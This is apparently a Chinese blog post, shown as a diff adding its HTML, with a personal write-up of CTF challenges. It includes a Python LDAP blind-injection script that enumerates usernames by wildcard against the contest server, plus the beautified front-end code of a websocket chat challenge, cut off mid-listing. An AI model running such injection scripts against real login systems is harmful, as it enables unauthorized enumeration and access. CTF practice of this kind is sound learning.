@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12,"scrollpercent":true,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="打比赛的时候要不是在忙别的，就是在出去玩，就做了一个密码，但是在队友们的血C下拿了一个第四，其中elegant-crazy还在赛后6小时干出一道零解题，在这里贴一下我们的官方wp:https:&#x2F;&#x2F;or4ngesec.github.io&#x2F;post&#x2F;dnuictf-writeup-by-or4nge&#x2F; 然后补了补题，wschat那个题真的把我搞得大残。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="暗泉杯个人补题wp">
+<meta property="og:url" content="http://example.com/2021/12/09/%E6%9A%97%E6%B3%89%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%A1%A5%E9%A2%98wp/index.html">
+<meta property="og:site_name" content="FYHSSGSS&#39;s blog">
+<meta property="og:description" content="打比赛的时候要不是在忙别的，就是在出去玩，就做了一个密码，但是在队友们的血C下拿了一个第四，其中elegant-crazy还在赛后6小时干出一道零解题，在这里贴一下我们的官方wp:https:&#x2F;&#x2F;or4ngesec.github.io&#x2F;post&#x2F;dnuictf-writeup-by-or4nge&#x2F; 然后补了补题，wschat那个题真的把我搞得大残。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/12/09/%E6%9A%97%E6%B3%89%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%A1%A5%E9%A2%98wp/assets/image-20211209110846004.png">
+<meta property="og:image" content="http://example.com/2021/12/09/%E6%9A%97%E6%B3%89%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%A1%A5%E9%A2%98wp/assets/image-20211209111251765.png">
+<meta property="article:published_time" content="2021-12-09T02:51:47.000Z">
+<meta property="article:modified_time" content="2021-12-09T03:30:53.046Z">
+<meta property="article:author" content="FYHSSGSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/12/09/%E6%9A%97%E6%B3%89%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%A1%A5%E9%A2%98wp/assets/image-20211209110846004.png">
+
+<link rel="canonical" href="http://example.com/2021/12/09/%E6%9A%97%E6%B3%89%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%A1%A5%E9%A2%98wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>暗泉杯个人补题wp | FYHSSGSS's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">FYHSSGSS's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-ctf">
+
+    <a href="/categories/CTF" rel="section"><i class="fa fa-flag fa-fw"></i>CTF</a>
+
+  </li>
+        <li class="menu-item menu-item-acm">
+
+    <a href="/categories/ACM" rel="section"><i class="fa fa-code fa-fw"></i>ACM</a>
+
+  </li>
+        <li class="menu-item menu-item-school">
+
+    <a href="/categories/school" rel="section"><i class="fa fa-book fa-fw"></i>school</a>
+
+  </li>
+        <li class="menu-item menu-item-life">
+
+    <a href="/categories/life" rel="section"><i class="fa fa-film fa-fw"></i>life</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/09/%E6%9A%97%E6%B3%89%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%A1%A5%E9%A2%98wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/saiki.jpg">
+      <meta itemprop="name" content="FYHSSGSS">
+      <meta itemprop="description" content="Do you like what you see">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="FYHSSGSS's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          暗泉杯个人补题wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-09 10:51:47 / 修改时间：11:30:53" itemprop="dateCreated datePublished" datetime="2021-12-09T10:51:47+08:00">2021-12-09</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>19k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>18 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>打比赛的时候要不是在忙别的，就是在出去玩，就做了一个密码，但是在队友们的血C下拿了一个第四，其中elegant-crazy还在赛后6小时干出一道零解题，在这里贴一下我们的官方wp:<a target="_blank" rel="noopener" href="https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/">https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/</a></p>
+<p>然后补了补题，wschat那个题真的把我搞得大残。</p>
+<span id="more"></span>
+<h2 id="easyinject"><a href="#easyinject" class="headerlink" title="easyinject"></a>easyinject</h2><p>是一个注入题，但是好像没有发现注入点，fuzz后发现在用户名字段输入括号会有warning回显到前端，发现是使用了ldap协议。</p>
+<p>借此机会学习了一下ldap协议，学习资料：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/212186">https://www.anquanke.com/post/id/212186</a></p>
+<blockquote>
+<p>LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询。</p>
+</blockquote>
+<p>然后就类似sql注入，有很多注入手法，本题注释里写了一个叫做<code>guest</code>的用户，我们可以用通配符测试一下：发现username为<code>*</code>和<code>g*</code>以及<code>gu*</code>都是能返回用户的，于是做一个简单的布尔盲注就可以，由于有多个用户，写个dfs即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://47.106.172.144:2333/?user=&#123;&#125;&amp;pass=1&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url)</span><br><span class="line">dic = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm1234567890_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        nowpayload = payload + i</span><br><span class="line">        r = requests.get(url.<span class="built_in">format</span>(nowpayload + <span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&quot;用户不唯一&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(nowpayload)</span><br><span class="line">            dfs(nowpayload)</span><br><span class="line"></span><br><span class="line">dfs(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="wschat"><a href="#wschat" class="headerlink" title="wschat"></a>wschat</h2><p>零解题，知识点特别简单：前端绕过+sql注入，没了，但之所以是零解题，那必然是有自己的恶心之处。</p>
+<p>首先需要看懂这个前端经过简单混淆的js代码，经过机器美化以及我的美化，最终长这样：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> gotoNewOfflinePage = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> y$$ = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">R, create</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">const</span> voronoi = y$$ ? <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (create) &#123;</span><br><span class="line">          <span class="keyword">const</span> fn3 = create[<span class="string">&quot;apply&quot;</span>](R, <span class="built_in">arguments</span>);</span><br><span class="line">          <span class="keyword">return</span> create = <span class="literal">null</span>, fn3;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">return</span> y$$ = <span class="literal">false</span>, voronoi;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;();</span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    gotoNewOfflinePage(<span class="built_in">this</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">const</span> PL$<span class="number">37</span> = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot;function *\\( *\\)&quot;</span>);</span><br><span class="line">      <span class="keyword">const</span> PL$<span class="number">26</span> = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot;\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)&quot;</span>, <span class="string">&quot;i&quot;</span>);</span><br><span class="line">      <span class="keyword">const</span> PL$<span class="number">36</span> = _0x6c017f(<span class="string">&quot;init&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (!PL$<span class="number">37.</span>test(PL$<span class="number">36</span> + <span class="string">&quot;chain&quot;</span>) || !PL$<span class="number">26.</span>test(PL$<span class="number">36</span> + <span class="string">&quot;input&quot;</span>)) &#123;</span><br><span class="line">        PL$<span class="number">36</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        _0x6c017f();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">const</span> result = &#123;</span><br><span class="line">    <span class="string">&quot;isOpen&quot;</span> : <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;orientation&quot;</span> : <span class="literal">undefined</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> _0x14edab = <span class="number">160</span>;</span><br><span class="line">  <span class="keyword">const</span> emitEvent = <span class="function">(<span class="params">button, value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">window</span>.dispatchEvent(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;devtoolschange&quot;</span>, &#123;</span><br><span class="line">      <span class="string">&quot;detail&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;isOpen&quot;</span> : button,</span><br><span class="line">        <span class="string">&quot;orientation&quot;</span> : value</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> load = <span class="function">(<span class="params">&#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    emitEvents : fromSubmit = <span class="literal">true</span></span></span></span><br><span class="line"><span class="params"><span class="function">  &#125; = &#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> orientation = <span class="built_in">window</span>.outerWidth - <span class="built_in">window</span>.innerWidth &gt; _0x14edab;</span><br><span class="line">    <span class="keyword">const</span> _0x4ca755 = <span class="built_in">window</span>.outerHeight - <span class="built_in">window</span>.innerHeight &gt; _0x14edab;</span><br><span class="line">    <span class="keyword">const</span> y = orientation ? <span class="string">&quot;vertical&quot;</span> : <span class="string">&quot;horizontal&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(_0x4ca755 &amp;&amp; orientation) &amp;&amp; (<span class="built_in">window</span>[<span class="string">&quot;Firebug&quot;</span>] &amp;&amp; <span class="built_in">window</span>[<span class="string">&quot;Firebug&quot;</span>][<span class="string">&quot;chrome&quot;</span>] &amp;&amp; <span class="built_in">window</span>[<span class="string">&quot;Firebug&quot;</span>][<span class="string">&quot;chrome&quot;</span>][<span class="string">&quot;isInitialized&quot;</span>] || orientation || _0x4ca755)) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((!result[<span class="string">&quot;isOpen&quot;</span>] || result[<span class="string">&quot;orientation&quot;</span>] !== y) &amp;&amp; fromSubmit) &#123;</span><br><span class="line">        emitEvent(<span class="literal">true</span>, y);</span><br><span class="line">      &#125;</span><br><span class="line">      result[<span class="string">&quot;isOpen&quot;</span>] = <span class="literal">true</span>;</span><br><span class="line">      result[<span class="string">&quot;orientation&quot;</span>] = y;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (result[<span class="string">&quot;isOpen&quot;</span>] &amp;&amp; fromSubmit) &#123;</span><br><span class="line">        emitEvent(<span class="literal">false</span>, <span class="literal">undefined</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result[<span class="string">&quot;isOpen&quot;</span>] = <span class="literal">false</span>;</span><br><span class="line">      result[<span class="string">&quot;orientation&quot;</span>] = <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  load(&#123;</span><br><span class="line">    <span class="string">&quot;emitEvents&quot;</span> : <span class="literal">false</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// setInterval(load, 500);</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">module</span> !== <span class="string">&quot;undefined&quot;</span> &amp;&amp; <span class="built_in">module</span>[<span class="string">&quot;exports&quot;</span>]) &#123;</span><br><span class="line">    <span class="built_in">module</span>[<span class="string">&quot;exports&quot;</span>] = result;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">window</span>[<span class="string">&quot;devtools&quot;</span>] = result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">// if (window[&quot;devtools&quot;][&quot;isOpen&quot;] === true) &#123;</span></span><br><span class="line"><span class="comment">//   document[&quot;documentElement&quot;][&quot;innerHTML&quot;] = &quot;Hacker!&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="built_in">window</span>[<span class="string">&quot;addEventListener&quot;</span>](<span class="string">&quot;devtoolschange&quot;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">document</span>[<span class="string">&quot;documentElement&quot;</span>][<span class="string">&quot;innerHTML&quot;</span>] = <span class="string">&quot;Hacker!&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">let</span> sock = io.connect(<span class="string">&quot;ws://&quot;</span> + <span class="built_in">window</span>.location.host + <span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> WSMessage;</span><br><span class="line"><span class="keyword">var</span> wsmessage;</span><br><span class="line"><span class="keyword">var</span> buffer;</span><br><span class="line">protobuf.load(<span class="string">&quot;chat.proto&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, def</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  LoginReq = def.lookup(<span class="string">&quot;wschat.chat.LoginReq&quot;</span>);</span><br><span class="line">  RegReq = def.lookup(<span class="string">&quot;wschat.chat.RegReq&quot;</span>);</span><br><span class="line">  ServerRsp = def.lookup(<span class="string">&quot;wschat.chat.ServerRsp&quot;</span>);</span><br><span class="line">  MsgReq = def.lookup(<span class="string">&quot;wschat.chat.MsgReq&quot;</span>);</span><br><span class="line">  LogoutReq = def.lookup(<span class="string">&quot;wschat.chat.LogoutReq&quot;</span>);</span><br><span class="line">&#125;), <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> fn = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">let</span> htmlAttributes = <span class="built_in">document</span>.getElementByld(<span class="string">&quot;btn1&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> attributes = <span class="built_in">document</span>.getElementByld(<span class="string">&quot;btn2&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> data_layer = <span class="built_in">document</span>.getElementByld(<span class="string">&quot;btn_send&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> list = <span class="built_in">document</span>.getElementByld(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> item = <span class="built_in">document</span>.getElementByld(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> result = <span class="built_in">document</span>.getElementByld(<span class="string">&quot;txt1&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> hl = <span class="built_in">document</span>.getElementByld(<span class="string">&quot;ul1&quot;</span>);</span><br><span class="line">  htmlAttributes.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> buffer = RegReq.create(&#123;</span><br><span class="line">      <span class="string">&quot;username&quot;</span> : list[<span class="string">&quot;value&quot;</span>],</span><br><span class="line">      <span class="string">&quot;password&quot;</span> : item[<span class="string">&quot;value&quot;</span>]</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> labels = RegReq.encode(buffer).finish();</span><br><span class="line">    sock.emit(<span class="string">&quot;reg&quot;</span>, labels.slice()[<span class="string">&quot;buffer&quot;</span>]);</span><br><span class="line">  &#125;;</span><br><span class="line">  sock.on(<span class="string">&quot;reg_ret&quot;</span>, <span class="function">(<span class="params">err, bbls</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      alert(bbls);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      alert(bbls);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  attributes.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// if (!/^\w&#123;1,16&#125;$/[&quot;test&quot;](list[&quot;value&quot;])) &#123;</span></span><br><span class="line">    <span class="comment">//   alert(&quot;用户名不符合规范&quot;);</span></span><br><span class="line">    <span class="comment">//   return;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// if (!/^\w&#123;1,16&#125;$/[&quot;test&quot;](item[&quot;value&quot;])) &#123;</span></span><br><span class="line">    <span class="comment">//   alert(&quot;密码不符合规范&quot;);</span></span><br><span class="line">    <span class="comment">//   return;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">var</span> buffer = LoginReq.create(&#123;</span><br><span class="line">      <span class="string">&quot;username&quot;</span> : list[<span class="string">&quot;value&quot;</span>],</span><br><span class="line">      <span class="string">&quot;password&quot;</span> : item[<span class="string">&quot;value&quot;</span>]</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> labels = LoginReq.encode(buffer).finish();</span><br><span class="line">    sock.emit(<span class="string">&quot;login&quot;</span>, labels.slice()[<span class="string">&quot;buffer&quot;</span>]);</span><br><span class="line">  &#125;;</span><br><span class="line">    sock.on(<span class="string">&quot;login_ret&quot;</span>, <span class="function">(<span class="params">err, bbls</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      alert(bbls);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      fn = list[<span class="string">&quot;value&quot;</span>];</span><br><span class="line">      alert(bbls);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  data_layer.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> buffer = MsgReq.create(&#123;</span><br><span class="line">      <span class="string">&quot;msg&quot;</span> : result[<span class="string">&quot;value&quot;</span>]</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> labels = MsgReq.encode(buffer).finish();</span><br><span class="line">    sock.emit(<span class="string">&quot;msg&quot;</span>, labels.slice()[<span class="string">&quot;buffer&quot;</span>]);</span><br><span class="line">  &#125;;</span><br><span class="line">  sock.on(<span class="string">&quot;msg&quot;</span>, <span class="function">(<span class="params">err, isSlidingUp</span>) =&gt;</span> &#123;</span><br><span class="line">    <span 